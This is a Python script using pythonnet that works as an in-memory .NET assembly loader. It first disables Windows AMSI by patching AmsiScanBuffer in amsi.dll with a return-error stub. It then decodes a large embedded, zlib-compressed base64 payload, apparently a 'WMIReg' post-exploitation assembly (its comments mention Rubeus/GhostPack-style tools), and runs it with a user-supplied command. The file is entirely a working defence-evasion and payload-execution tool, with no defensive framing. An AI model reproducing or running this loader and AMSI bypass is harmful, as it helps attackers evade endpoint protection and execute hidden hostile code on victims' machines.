import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "eJztPAt0XFdx896+ffuRtPZK1seWZG8UO5YleS3bii3bUWxZkm0lkiXr4w9xoqxWT9LWq1357a5sNdgRJKSFE4ITkjQ4EAgF2lAOn5KWlECAUH6toZSmH3paH1J6gAZoKL821CWdmft+u1rZkixMKTzpzd6ZO3fu3Llz587bvbvdrzkHLgBQ8H71VYBnQFx74MrXDN6BNR8PwNO+L1/3jNT15esGxmOp0KSeHNMjE6FoJJFIpkPDWkjPJEKxRKi9pz80kRzRwkVF/rWGjN4OgC7JBTu/+NmPm3K/ATVQIDUC3IGIV9C+dQZByOiUtKOyLPQGsF/h04JOlwv2vAFgOf/br9YLXw+j3B5jMG935xnkuwAK8eU08lXNwybWFbJU58uL+AEHHk5rp9P4+r3bjXHdYevtEHFnWE/pUTB0Qx1BxfvObL49+B/WtXgyKnQlnVnW6Cy+vblqfvGMeD3ATdzwgX0AF7YBSIgXid4WdJU0uuE24PbBFBra75cLygrr93u854t85W8ux5p1ZWta3pEMYl2JElQeiFWEi3Vkn/TVFiOttgRBfYkaVMrOJ1dgOaiUn0+WYsFbfrTQ63kgtuWjah32I8PdLh5mUNYj2DxZhjwbS/UklllILZpMLa/FLv2y/jEHx+fycrCMCiw2LHcgM6iZIutFktncu2KG3K5+uUFkJpmZ1jiZXAbTGovJxUybnUyKwbTZYlKYabfFVKgfw/KM22DcbTG6mfFjTqUtZMbDlbc7u/IaEm63JHiZ6aSTyWcwnbSYfMx0xsnkN5jOWEx+ZnrQYloeQoPM3I8mlmfQg5Q6o5KYeU79au0mNH2BJ6TeMRS/sdkT+tT3tx27cYUn9MbCN9646xV0IEEKH63zhD79bFNk1zmmfe7zTePhUdEsnMS6beOffAu1G77YdGrXA8xDpHAG657+7PFz4VpP6HE5/sKue7jurW+68PKuN2KxTtUfR5VqV6I2O88LwnstwtsE4S8twmOC8LcW4fcE4RWL8KgguGST8IggrLcIDwvCZovwVkE4ZhEeEoSIRXiQCLnGnIXDFXDpCrj7Crjr8vhquXYVKlun1oX1U7KxtOpQicpGD/yLRHEYggF1427ZpbgDSsAd8NbW4Ow3FJuE2gZEm59AVj1eApNIsCKBWJ3Nr8e6nOY7jiBthd+iqrUb2aXKj3UUGPGPXtHdoBrv7cZ9g6NMN/oh1N9Yfj9GGNlf31BhFK5faRRWrTIKwWqj4F1TIEpqoXfHn2Fz77oSJUOUHX+EWFB5L5WLfCXuoNuhDK4MWI93M94njLvTUab7NaRMzDGkNWSYN4Bj8GotSlfr0w7CMiJEHYRiIvQ5CBVEaHUQKonQOIe168vnqLi4qkTVP49VQTVZSVVW/UXACW91bJBfkMSNngHIJVU2FsIZsV8HLT18YiJvlGkiA94dTyJzwMsRosCjXywxlsHGfR79exbS4dF/biHtHr1whYm0efQKC9nr0RstpLX5MyjamOTmP8GyMc/NT2HZmOrmd2DZmO1mWnnGhLP9zTmvvyvH4Qq919Dhinw7XsbmvnUlbuFwL5LDudnhaDPFbVM11KF8AecINuPdhfc7jXvEUab7d8glz2d5WMBTGyK/ezqXWsbLNJdaRU6wnKruya2qNvxDrT/hpFt5QIPIA2iS1PoDWU1XE73qCm5604o53NQj3NSTz02z/HRYFrftpx7oE+YLOmaa49UyK16tJb3K9Yfyd1/h597zrhHJSD537ICK+fd3g+hPLl2S/gbm6M8meGprRY/xhfZo9rdr10LGVyd6e+nqx2duRpWNfrggcQIblGupUIuzrJ6ldM5IQfQ7ysz40Kfqv2UhZ1RdN5Gd70fZqj5j4V9i/GEL/w7jH7DwQuygeQuCsxTszlLOd5ZyurOUr52l/fIsJWdnKfk6S8lV+f2ojVyr0vpRFtDuLCVdFaKxhxp/Aa7UeE1IsHuJ/bErsocoixctfDQ/sfmys5K1fmpz4+XbrBbiC4jVT5udSMkvVhTwjOdZvs61+1FJ3BXG2rXnXoEKpHvoGSTEzyAN9aqcvA6LqitZQy/6n+KUKSw6eT2JDt6grkyupZLHKOhfQRa3/gLN7Tpqk8Jl6F+XXE91P0BqCheJf0VqA1F1tRwT3Dqxc63FckB5L3Yk3U8gWY90j95EZLeBdBGiMsJtPSuSmAX5CyvfXMGxUR9G4rvXlQfUd6+r0M8zsjLgfve6VfrHCaHNR1jFqz9HfYexmEZrV1Jqbdiroojt6MuzTtmOPriuDvzLxeMePf8ba1aBUomfX6+d/S4s3n4eNkDAI4x5wTam/pJpmNpGWtkYQSuoFUe4zaY16kv10TzkixWFbDxv3j0kn/0uXcqNQQqUXGs//POKxfshtV0SP+Qua7dc3gXz2vBnP7N9cO219sFvLN52pg/avCxtDkescjgit3B44yqHN+bUXcYlW5tETMRIDWgj9lGMwGDala4CSdz54uU199NLV+Gnl67ST+tWmvGS2l4pVF7RT49daz9tXnkVfkqDN2MlCZrDRXdUmYYdXTmXYR/imsqAx2Hd+u1Ww7cvqOHl4+18/HuPJO58/t0gcdtrN0fPL36OuO3S+DcmXpVFZSVK/TJfUDnP1UGl/Cg9K/oeiG15CR+V3OJRyb24mBKUxG0/P/0ScoeXlmo9vDT3evh1yB2KVy3eZ6ntr3PuEF687azcYa2VO4RXzS93WHuZ3CG77heUO/xS/fWWq/DXW67SX3/Vc4jxq/FXZ8wcn9tV/5/lEJUS81+7ObpvgXP0xCqaoxwelmJO0B+vyn6HTQ9UmjO2ldBQpfFGVkOpXleZ825c4cXVZYUXV+V3cqwBb34/f/VVWJVryx/BNfb311YuxJbMPodXl+jncixTH9S/lkO6nCfms9E//uPs/f+a26iwakE2IvY5bRSqmmWj4aqlt1HgWsfNJxZko+w954m5DbZK/1Oyjqr/VBipybJbhb68Om/NZYNdPvv95Cez7XcJ+FOra2e/A9UL8jFiN012lOzg5q2YOxIR7MPVzoedwrKi+kKvTzzq+MqPFvm8+Jzz7/ico4jnHGV+74W++OLsmPVtic/XXDtbPbcwWz1n26qsUH8hr7XqVhsf0K/TD682DafQU2KOIUuUshJ381fpEU8Jus+XqD7vwyWeoPPj9VK8UV3YhXfauA86ynRH8K7X9eHV9KGxIxpM6nou6Xb9vlzSLfqjuaTt+ntySWv153JJQf1CDolODwXd+OjrDrrp1NHuda+++iq6hVe4Rb5FNJ98gT5jupDz/PtD4LNTvwp+kusFhTleEFDps7P6Iq/v4RLlYvVcbxaUYSX6yRxx52tfg2rnWqKzW9g5BOizuYb1oc+9o+p1/rKC+hWyJ7mNBhsJvVUC6TV+T/nRAo+c3I60Ld9U6/b237JXMkxP59ymmsKN4a2NWzfvIIob4gj/HCuuPwvQiBNQhQ8j1/en9VhiLEUcXSsA/mE10gb7Ye1WcQ7w+v2Dne342oT4Yzji6/fGk8PG3KKPS0eqZa+PJv1n0lY6wkG9rzN8H+eOP81/FsQn+3TCY5kYF59HlIx14gLTYT7kEq8q+F2H3SqcYnizvNa9DKboky8Ylf9aUeH7DL/C8A4XwTqGbQzPML1P3o5tGxl+hCmPyV9yIb/6Fiz74VZJhW8qVH4UoR8uuGdUP+xWZ1QVSmXq9/tcu4HhExLBh7jtEyrxDyvE/22J4F4ul6oEL7KcAZbjAuJ8xk3llUBtn8G2NMIQj1Piv+XwQ+V5VyuIuVsOr7gJK+AjCsshowisiDl/rL5PJWwZYylJYMWMrVcEVspYsYFVMDZtcFYyFnQLbDVjGwzONYytM3qoYexzBraWsb8ysBsYe8QlsFrGvm7U1TH2BqOHBp7aDfR0gdgmkBF7P054N2KNjP2BQljQwP5TIqwasTL4C+UHUhm8IBG8h+G7mPJnXH6/60cIv69S+fNMeY+L4CUsq+pO6afS4Rm/9ArCrwDBOxh+g+GTCE2eB+F/EN7DUJYIVjH8LlM2cfkkl1/L8E8YHmD4PEKSI8mHZzYoCkIXwx+rBPuAYDFTjmK5lyf9UTjn9uJQnzGw8+4SWYY2PvB7X4XiJq+5lbEHK/zudyLWvVZw3i8RdtzA/lutll0wfoPAlsl1ciEs3yAwSW6Wy2DGwP5KbZar4QcG9oirTV4Ld9YJ7FGlWW6Ar9bZvW+FfzDqHld65K1wocGua4IXGkTdhDooN8GKsMBOqnfKu2Bgk83ZBsc32Zxt8FijyTkh3wKXNtucaKUtNmcf7Nlqck7Lx+CfmmzOCPxrk80Zgd5tJucb5HE4t93mnITHttuck/BCs8n5kHwKmnfanHfDnizswE673d1w7y5bl/sg1GJzPgC1LaLuuPKE/ADEb7brHoH0zeY8PCU/Aud223WPw2O7RZ0X6x6Hp/fYdU/CJ/aYdYPyk/DjVrvuD+FSq6nZU/IfQqjNrvsg1LbZdR/kM+OEPen6qPw0xPfZnM9CmrG3QqPyJo7LEnzUTfAPGL5AxwhxrVFMfhedR8C1RjsHrViMhyq9f/V5fqJ4j4t2sTp1Ma0u8fsE82/7i+L0wvukhUkWtvrwZfmfY34heb6cwjK/kfzrIVn40pU5l4pn/mNZ6h43qT5Q3BLu7hR9ViL0Yy6guJfDZoY7GLYy7GR4iOExhhGEpRDj8kmG0ww/wtIKGX4GMmojws3qdvgS/LPUguVLyl6svU/Zh/BFtR/+Gu5Sj2H5jHIH1koeDV7HbR+Eh6S98HX4putehBK8CWE5vIXlvBOjsYjJX5WWI7ybYZGH4DPKB7nHp+HfkOdZhBrmd//Bur2C8HnwSZL6ZXgKdfgbLI9KX2f+f0XKGeUl7OXHrh9yj5L0GWhWVYl6DCDXaiUsEedWaYP0cdc4ll9234XwkDIj+TAnehRhEzyOsBnehfAmeC/CPfB+hAfgQwi74GmEvTgjPhiA5xAehc8iPA5fRHgnfBnhCHwN4Tj8PcI4/BPCSXhR8sJplOCF16IEL8ygBC/cixK88LvwLYT3w3elMGZtz8lhKIEvIKyEbyG8Hl5GWA//jXArw10M25h+K0iuMPQz5TaGUViJlBOYq4chBb2YjdyF/a7CJ+MTcAoehrfB78N/QYm0Vtol7Zduk6akDfAyXCcdlZQZx4MlX8+7HN9swuteaS8zOGlvlmb4Wzol6K0r8C7F+wTQN2pgIDnYmUhv3QLtsWg6lkxE9Ok7txjUbU1wU3dyJBPXboabevXYVCStdU5MxrUJLZGOEHe7lo7E4qmb4Uhf50DHUHtrG7Qf6elrh0MMD9zacWyoq6ettWuou7XtQOfBDiBKW19H60AHtHd0dQwISn/HwNDh1q5BgR0a7Og7ZuAsom2wr6/j4MBQW8/BfZ37AZu3U3mgr6fL6LnnyMGOvmzmwX6TQqV+ltxxcLC7ow87H+of3DuElH7UYl/rYNeA0bartb+/o3+or6dnwKGqyc2kgz0DnfuOwVQkntGGhmAiFU3q8dgw9E+n0tpEuC0Zj2tsylR4v5bQ9FgUOhNTyRNat5YeT45A+6mkPgKHGKa09FBvJJViZDAVGdNgDEndWorLbSgkGdfgMPV1MDKhIY+mc6EtOTGZSRsI1yeoRAKJh5EjeiytdcUSGnRHEiiPpq0/mpw0GgxMY6lN13BWoV2La2mjBcuOxTWd1cfakdY0PiEPY3ewPxNzYO3acGZsLDIc12waNj4cS8WyaK2plDYxHJ8eiKXzkvXIiDYR0U/YVQMRHQ2xT8dhoG1OzG6zDxU8rOkptPPsSrTbaGwso7OPzq5u11JRPTaZXSkGzS36tHjkNJdSsxv36rgioul8nU5O67Gx8bxVE5ORxLRd0ZdJpGMTGtPTseFYPJaedpqVJoPnCPZraVE4EJvC+enu7NPGwtppDX1qRDvdM2qQTO8zBIcN08QSY7BPT07sjaS0bU3ifQ5c3Flox+m0hrJGDLQ7E0/HLE6LxygYbiewA5HUuMO1eiPpcXbfLi0xhsW2cS16AjBgoC4YWMieXdqUFode8e1P5u1ErdlruSBGAR2JzAQKjiWgPTlBL63RKC6JXk2fiKVoXKKFUzKy8ItpB23UWIWoe1TjuUaFIjq06mO9ER2XCI6uK3kKX8PRdJIgv/Rr0QwuAstHiCREtsciY4lkKh2LpnKtjbFS05OT/Zo+FUNFc6vN9WTVi3WDFsToiigNlycZ9wJSDVVM0RKNjeDiY8T4viyXIwScEaWHR5eiaJEQYzYpPcO/hQR0IZNAFicrpOCAFifrkX8JKdgzLrY00ewpbYtjcBITKaaAOolG0rAvqU/gi81JLiW6cxANgqEY9YX2xXsS/R3nBYFhKbsJGmMqpicTXMaGU5qeNt2+Pz2CL+g9UziLemQa+jPDt2rTRgyjklg5VCKbcl0St6pYIkVlZD+BL3tjtMvBoYyGMDk51HEyE6EFyE7VmkFjkAPg3jh0G2yE2yGE2ZkOY5CBCdAgAWmknMKcLI35QwiGMUcbwddRSCLXBGJUP4mvKfzTsK4B8RTutzGkTiJMoKydSJOKIpgJpJGSRBrsvw2u4946UI7O0q7jvm2eEErN1UTH0kmkxLg0AlCUQmwY+9MwV5xLar+DZ15SgxkejY71EeaDoDnGUyyVeh7BElmAxggro4xNopR0dkvMeqBkCrE41mk2vcCmOevTqOMk0XzjKHnKKJ3A2gmAdePGKIYQT6KtqNUQaxGFcdbE5I+iDnC9zR9FTnOWUoiTdZL0iYTBncnhzrAFhYWGwLSHyR0FWD83d5TnbxT1GcNHA+JD6aU2vyktBXDuR0Xgh0EsRpBZQ1chPGT8HYFufEzoQ/oYhBGexjsETkdqQZdpw8S3E3owoSTXs6e6BSd+EPZiStqBDxghTEdzp7UF6/uxtg/btmJfHQ5nNie6BZPrVuTqR216kLMdeZxT34KUHmzbijqQBnM5QgvqSXy92OdATp/mVLdgUt8Jh5k222VasKYVE/5BrLfb2nzO+tvZjr3s7KJ12jB5toUjWQtu9l/2gkzja4jdU7dCQBgp3WzZNAcImqH1vJyIaxrLDUxJsQ4mFmV3ibBWJm0Ey3FDUzGD+Wrs8Ypa0oJ4yE60qNezRrXsNc5FvYHH7Rz7lf7sMexcUDvz75DVnuxMvkmWi6JGtDSiWXNH4xjNy6dxwHX69UJ0EVZfnP793Fbo5NR01LB55Cr0cs7/4rRrc0gQulDwO3UVOs32v8Vp1u6QE+KNU4OlndX862EptJ3L/7LnX+cYd3UeYK7XxWndYbTWOL6lDQvbmqQg109nj0nnfSXGkUusUnsUTp2ccvPp0jeHnPzxMjfmCjhXvDL7yN25cnXod4zPjDez28xHH9r9wll95+6IV+p7Nr85E0ulkXP/zTcjuRpl8+dqs1gt5trpzfq2nPq5+jEjRG5/Y4bG5Fe0p3XyDpHgtI2k0CqcQo4RMBNvOykcx5LYkWO8FjJGep49AjPvmGuV5dpx9oqxJYixpY30WuwctZjP3IoZSTdrR+U2zE7scp9VdlLbcnx/diaUreVBiyr20Nn7rHMFr2d7OONZfs1z16PtN3ZeIB52qEUDz1iC+fJH5+z5Tc05xvwzMcj9mLqmDC2zI9PsMc0V+cirhF9efqRmP4sZGd0dmLFHeA3EZ+1Ps7Oj/GPJvz/M58ngpKOH3OeCHtiHWfgRzG/7UMvjKC3GOQmtGvKiNNJ6WOv8mXgHl4eZo93I7J16OssLzaMWP+J8fvGLGm32k8exWbvm7PxsacYYzZK7+JEex7hB+eKteff8fFnRUmg/O8f8ZY0hNw4uzZic/n2t1pxT7yvnhYsfp5mxXs3IqG/pmPlWm/021U6eL4rZ5v4+jr2LnVXkCxO876asKGvGeGeUk8rzS5aKxI4t3o6DII0vi1I0zKUIy4GCEfttrvIJlB9nK2S1KDhp8wwu5XjMGCYll1KqeAvwVjCfDWY/JUixpezPuSZy9zbpzC+up3z7S07vqaXsXcuz3vLYtsD2UvCIGYYiZySHktmREcrzRxbwmb1C+UFcd5RfOt+D2wngPo4rDiqPW29zHmc7jaIM4c1Q2o9wxFjxvUYuDdX7ube9jtVw2O532TjH1FHDj6A8leVXZh4KpSlHK4u6/TaoZ7tTG3oLVWOLjrJGcSu/FmtMY+tTzgVr8s+qOZ/g8qMtM049q/svN4ryPq7N8BOLgx69sn7m2rwLGuHMHN5m6nUXbGaeCHvCXbAFMbjd9L1BRyzPXfmLlS5Vitlrt96pdYyusn/uuo2iHWWrk0auS7bvd8Q7B3dRKqtt/0La1s/fxuAzRwfr5mM1ab0YRbcVr+fQYX3//PgMax66jDXz1hlraA6phm/OUVvexs/CUZznVod9oCQz6ykFbruyLaOWNLGW5opls9ZUcBj2c0RLcOzB3nwDiLOOh8x+B633D8aNmYo49FhAbyXOXNmILa3zGZ3daiRnj0OpOy7nNdlZdHZLqcSZOc5fH2e0zqPPrsvpc/m2UrlTI4e/7F64Vs6oAivt2cjRdvt8tc2WKC0zM1DDbkcWF/Vz85VZPoNRyNxZcH2Umr3atklxXraYvp0y8vRcP2B8ROlzcPrRWuLPZ5U24r5v8qI2y5xr3odeTzEzh7bMuWchXmTHa8RW5o9ZxHfIyVdwEGetC/+w/OLP6/65oLO7+7GLr4/9cesHV4MSkiSvC2fKjYVgkNAAATngcZcWd8iBQHXAi7cqEDUkVQeqXW7AckABZMa2AU9IlkqgRFI8csCHguQSoDovcpdgBXIje4HHU+WtCg5UeYs7Cz3eqoCJuEGqdpMwH4GCgOKRkIiiijvpTKnfoxQfKh7Ev07W8aQKLuwcVZGlQPEhf8glFWeKp4tnXofVxYMBN9GrkIxlbDTzZpSPA8BBVQXkajdjbq/HxUI7qdsqDyiBQFVVFSntK/Kooj8ceHGnXB3wCQVkZg4I5gCNx01k5lru8VHZW+0la3Ezb6GQU+31Iu5bLsne6tWwGvMTNLBH9nlRIRdZ3uv92G8fP7yy6Rtv9H5499Ddwb/176TzezP0a38zCv2Yr0K/qKu4DRoQDRT+VXZiVOh3xBX6shL9xh6d/ZMIyMBHUxU6m6t4qIK/l6cGZLVKVn0uNdiFd6+sevFlAB/DzNn2oRFEuRB8Eo20im58VLMQNC94DKyqALxmMYDGRf+wK1GEWYlGtzkDPkc5iyngqChAQbIh2geqQUai12DwSsaPqK+m7w4NyGVH9MjkwWTCOvYzMK4nT6Uk5BO/nV4ggWocmgI32RLKJSi2Tm+Fnn8qFNrSSF8Y2yDB2pHh0ZEtm0ejGxujw40bm6KjTRt3aFtGNzZtjWwbuTGy9cato9sACiXwbA430h/AfglWhQ92DFin1xqM01gt9G001DGwwqpqj6Um45FpOsW3nNqErJpQk/OUp/P36On6xBm7/Hfm797nub54xokNtSX1jtMan6zic4uaFh6Jx7nu1XUQ2pNfSNYlsy7Y3Qz9/kGv8Wv79iW+wdWch05XDtHiH5+D/+3o4uewptBl1xS6yDSHMeAN8cGAPiyJww5D/LCzT/xaP3xSefnnQo6UJXO3gSmQe5YWoJ1phznc7sNgSltaJ5/cSHL9Wm41YCRCKT5BYp3g4evDSpy+FJgVjmdLOsA8jdZfE25t9PWgVWwP8TGJeRonZUiucdSJxNrxgGVc28CDPGZ/7bzNRFmPySw9nW/u0NWIi8hudxjEwQibfzOEkce8qZ8C5O80kkHxQU/coU2+N4/oOsDf0+tiOrWg0UziOHQ+GTNOj6F5aCF4CugtqS3Y92agr3LWsS1sOWJGKAmZ4Lk7YVkN4GbWtceQFzN0NceauKLOYbapeCAe4bQhnWX3XFs2sS2z+XMtmmvPZm7TCuI00gQnV9OceFy+3QfuAXjJ4cQvP/upm3afnoiHpoyQU4NhqSakJaLJkVhirKVmcGDfxuaaUCodSYxE4smE1lIzraVqdt9c5C/y3xQxDqyGUEQi1VKT0RM7U9FxbSKS2jgRi+rJVHI0vTGanNgZSU2EpzbXhCYiidiolkofdvaHwkIhS1jniJZIx9LTWTrRX02Ijim31HRPt05OxmNRPsgZjkxO1mwSEtJ6JpXuTIwm56nPFtEztkwZxzgNHCm6djKDemojdJA9FtfGtNQ8pW6tsaQ45WAgjWasQ62hOMGWmkhKHM3Ua0KZmDgz2VIzGomnNGNQLGRTHm1M1Tdl6X7TJssIiN+0yTTqzXDtrknxXervtFzDPn9z/Z+5/hfM06OO"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("WMIReg.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()